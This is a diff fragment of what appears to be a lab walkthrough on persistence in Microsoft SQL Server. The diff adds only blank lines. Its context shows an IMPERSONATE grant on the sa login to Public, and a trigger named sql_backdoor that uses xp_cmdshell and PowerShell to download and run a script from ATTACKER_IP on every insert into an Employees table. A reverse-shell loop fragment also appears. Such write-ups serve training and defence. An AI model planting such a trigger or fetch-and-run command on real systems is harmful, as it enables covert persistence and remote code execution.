@@ -60,9 +60,11 @@ GRANT IMPERSONATE ON LOGIN::sa to [Public];
 ```
 
 - Lets configure the **trigger**. Run command:
+
 `USE HRDB`
 
 - Our trigger will leverage xp_cmdshell to execute Powershell to download and run a **.ps1** file from a web server controlled by the attacker. The trigger will be configured to execute whenever an **INSERT** is made into the **Employees** table of the **HRDB** database:
+
 ```
 CREATE TRIGGER [sql_backdoor]
 ON HRDB.dbo.Employees 
@@ -70,6 +72,7 @@ FOR INSERT AS
 
 EXECUTE AS LOGIN = 'sa'
 EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
+
 ```
 
 ![WLP52](/img/WLP52.png)
@@ -96,6 +99,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 
 $client.Close()
 ```
+
 ![WLP55](/img/WLP55.png)
 
 - Same way we transfer the script to the victim system - python server
